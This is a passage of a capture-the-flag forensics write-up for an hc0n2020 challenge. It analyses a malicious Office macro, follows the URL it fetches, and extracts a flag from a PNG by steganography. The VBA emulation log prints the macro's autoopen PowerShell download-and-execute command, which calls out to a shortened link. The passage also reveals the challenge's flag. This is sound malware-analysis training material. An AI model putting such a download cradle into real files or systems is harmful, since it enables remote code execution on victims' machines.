INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(21, 247, 144, 27, 49, 65)
INFO     calling Function: Array(86, 199, 223, 60, 24, 104)
INFO     calling Function: cLuPucvBWJqtI([21, 247, 144, 27, 49, 65], [86, 199, 223, 60, 24, 104])
INFO     calling Function: LBound([21, 247, 144, 27, 49, 65])
INFO     calling Function: UBound([21, 247, 144, 27, 49, 65])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: Run("powershell.exe -NoLogo iex ((New-Object Net.WebClient).D0wnloadString('https://...)
INFO     ACTION: Run - params ["powershell.exe -NoLogo iex ((New-Object Net.WebClient).D0wnloadString('https://bit.ly/2NgCC0O'))", 0] - Interesting Function Call
INFO     ACTION: Run - params "ly/2NgCC0O'))" - Interesting Function Call
ERROR    Application.Run() failed. Cannot find function ly/2NgCC0O')).
INFO     calling Function: Array(7, 143, 3, 57, 161, 186, 43, 192, 109, 64, 182, 241, 63, 42, 147)
INFO     calling Function: Array(69, 223, 80, 77, 196, 221, 74, 174, 2, 96, 193, 152, 75, 66, 179)
INFO     calling Function: cLuPucvBWJqtI([7, 143, 3, 57, 161, 186, 43, 192, 109, 64, 182, 241, 63, 42, 147], [69, 223, 80...)
INFO     calling Function: LBound([7, 143, 3, 57, 161, 186, 43, 192, 109, 64, 182, 241, 63, 42, 147])
INFO     calling Function: UBound([7, 143, 3, 57, 161, 186, 43, 192, 109, 64, 182, 241, 63, 42, 147])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(43, 70, 195, 196, 145, 43, 241, 249, 89, 92)
INFO     calling Function: Array(120, 7, 143, 135, 217, 98, 178, 177, 22, 18)
INFO     calling Function: cLuPucvBWJqtI([43, 70, 195, 196, 145, 43, 241, 249, 89, 92], [120, 7, 143, 135, 217, 98, 178, ...)
INFO     calling Function: LBound([43, 70, 195, 196, 145, 43, 241, 249, 89, 92])
INFO     calling Function: UBound([43, 70, 195, 196, 145, 43, 241, 249, 89, 92])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: Print('BPStegano with SALCHICHON')
INFO     ACTION: Debug Print - params 'BPStegano with SALCHICHON' -

Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| CreateObject      | ['WScript.Shell']         | Interesting Function Call |
| Run               | ["powershell.exe -NoLogo  | Interesting Function Call |
|                   | iex ((New-Object Net.WebC |                           |
|                   | lient).D0wnloadString('ht |                           |
|                   | tps://bit.ly/2NgCC0O'))", |                           |
|                   | 0]                        |                           |
| Run               | ly/2NgCC0O'))             | Interesting Function Call |
| Debug Print       | BPStegano with SALCHICHON |                           |
+-------------------+---------------------------+---------------------------+

VBA Builtins Called: ['Array', 'Chr', 'CreateObject', 'LBound', 'Print', 'Run', 'UBound', 'WFrUpnxVDIcv', 'eDAtkQQXcuQPFD']

Finished analyzing babymaldoc.vba .
```
We analyze the URL to which the shell invokes and download a suspicious .png file that Stego has with the BPStegano and the SALCHICHON pass.

```bash
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# http https://bit.ly/2NgCC0O
HTTP/1.1 301 Moved Permanently
Alt-Svc: clear
Cache-Control: private, max-age=90
Content-Length: 218
Content-Security-Policy: referrer always;
Content-Type: text/html; charset=utf-8
Date: Mon, 13 Jan 2020 18:15:01 GMT
Location: https://3.bp.blogspot.com/-ZmsSic72HFI/XhhfnENnx-I/AAAAAAABXbQ/N2yJvmqwgSM-UyJp0Y42RfaDS8W_7PxbQCLcBGAsYHQ/s1600/whereisyourgod.png
Referrer-Policy: unsafe-url
Server: nginx
Set-Cookie: _bit=k0dif1-984d764b927c94c3ca-00Q; Domain=bit.ly; Expires=Sat, 11 Jul 2020 18:15:01 GMT
Via: 1.1 google

<html>
<head><title>Bitly</title></head>
<body><a href="https://3.bp.blogspot.com/-ZmsSic72HFI/XhhfnENnx-I/AAAAAAABXbQ/N2yJvmqwgSM-UyJp0Y42RfaDS8W_7PxbQCLcBGAsYHQ/s1600/whereisyourgod.png">moved here</a></body>
</html>
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# wget https://3.bp.blogspot.com/-ZmsSic72HFI/XhhfnENnx-I/AAAAAAABXbQ/N2yJvmqwgSM-UyJp0Y42RfaDS8W_7PxbQCLcBGAsYHQ/s1600/whereisyourgod.png
--2020-01-13 19:11:17--  https://3.bp.blogspot.com/-ZmsSic72HFI/XhhfnENnx-I/AAAAAAABXbQ/N2yJvmqwgSM-UyJp0Y42RfaDS8W_7PxbQCLcBGAsYHQ/s1600/whereisyourgod.png
Resolviendo 3.bp.blogspot.com (3.bp.blogspot.com)... 172.217.17.1, 2a00:1450:4003:802::2001
Conectando con 3.bp.blogspot.com (3.bp.blogspot.com)[172.217.17.1]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 101568 (99K) [image/png]
Grabando a: “whereisyourgod.png”

whereisyourgod.png                           100%[=============================================================================================>]  99,19K  --.-KB/s    en 0,1s    

2020-01-13 19:11:18 (697 KB/s) - “whereisyourgod.png” guardado [101568/101568]
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# md5sum whereisyourgod.png
a5124e54e2436fac90d76062951da5fd  whereisyourgod.png
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# file whereisyourgod.png
whereisyourgod.png: PNG image data, 323 x 273, 8-bit/color RGB, non-interlaced
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# exiftool
babymaldoc.vba      whereisyourgod.png  
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# exiftool whereisyourgod.png
ExifTool Version Number         : 11.76
File Name                       : whereisyourgod.png
Directory                       : .
File Size                       : 99 kB
File Modification Date/Time     : 2020:01:13 19:11:18+01:00
File Access Date/Time           : 2020:01:13 19:11:31+01:00
File Inode Change Date/Time     : 2020:01:13 19:11:18+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 323
Image Height                    : 273
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Exif Byte Order                 : Little-endian (Intel, II)
Software                        : Google
Image Size                      : 323x273
Megapixels                      : 0.088

root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# strings whereisyourgod.png
IHDR
sBIT
_zTXtRaw profile type APP1
LV((
04006
IDATx
...
ofLx
jQ*O+
7=;{
d3s'
c$rPx
>'+exl
dpP1\
^`CD@%T
NPGpG
w^Ls
.on.
4YF%
IEND
```
<p align="center">
<img src="whereisyourgood.png"/>
</p>

```bash
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# pngcheck whereisyourgod.png
OK: whereisyourgod.png (323x273, 24-bit RGB, non-interlaced, 61.6%).
root@1v4n:~/Stego/stego-toolkit/scripts/BPStegano# python3 stegano.py
 _______  _______ _______ __                                 
|   _   \|   _   |   _   |  |_.-----.-----.---.-.-----.-----.
|.  1   /|.  1   |   1___|   _|  -__|  _  |  _  |     |  _  |
|.  _   \|.  ____|____   |____|_____|___  |___._|__|__|_____|
|:  1    |:  |   |:  1   |          |_____|                  
|::.. .  |::.|   |::.. . |                                   
`-------'`---'   `-------'                                   


Select a specific functionality from the menu below

1) Hide a secret message into an image
2) Find a secret message from an image
3) Exit BPS Stegano

Menu option selection -> 2

Enter the SECRET KEY that was used to encrypt the secret message -> SALCHICHON
Provide the PATH of the source image -> ~/CTF/hc0n2020/Forense/Baby_maliciosus/whereisyourgod.png

Invalid file path. Try again!

Provide the PATH of the source image -> whereisyourgod.png

Decoding...

  [================================================================================100.0%=================================================================================]

#####################################################################
HIDDEN MESSAGE: H-c0n{5619b327cc5ecce85a7fc99a14a6c5c5}
#####################################################################


Total execution time: 0.1075601577758789 seconds

```

### Flag

`H-c0n{5619b327cc5ecce85a7fc99a14a6c5c5}`

<p align="center">
<img src="hc0n2020quals-Challenge-Forensics-Baby_malicious_meme.png"/>
</p>
